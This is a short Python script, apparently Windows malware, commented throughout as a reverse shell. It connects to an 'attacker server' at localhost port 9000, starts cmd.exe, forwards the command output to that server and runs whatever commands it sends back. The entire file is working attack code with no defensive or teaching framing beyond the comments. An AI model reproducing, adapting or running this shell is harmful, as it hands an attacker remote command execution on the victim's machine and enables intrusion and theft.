from subprocess import *
from socket import *
import os
import time

# Connect to attacker server
server = socket(AF_INET, SOCK_STREAM)
server.connect(("localhost", 9000))

# Run command prompt program in separate thread
cmd = Popen(['cmd.exe'],  stdin=PIPE, stdout=PIPE, stderr=PIPE)

# Run until 
try:
  while True:

    # delay waits for command prompt to finish executing command
    time.sleep(0.1)

    # Send any output/response to attacker
    output = os.read(cmd.stdout.fileno(), 2048)
    server.send(output)

    # Run the command sent by the attacker
    command = server.recv(2048)
    os.write(cmd.stdin.fileno(), command)

except:
  print('Terminating reverse shell!')

finally:
  # Cleanup resources
  cmd.terminate()
  server.close()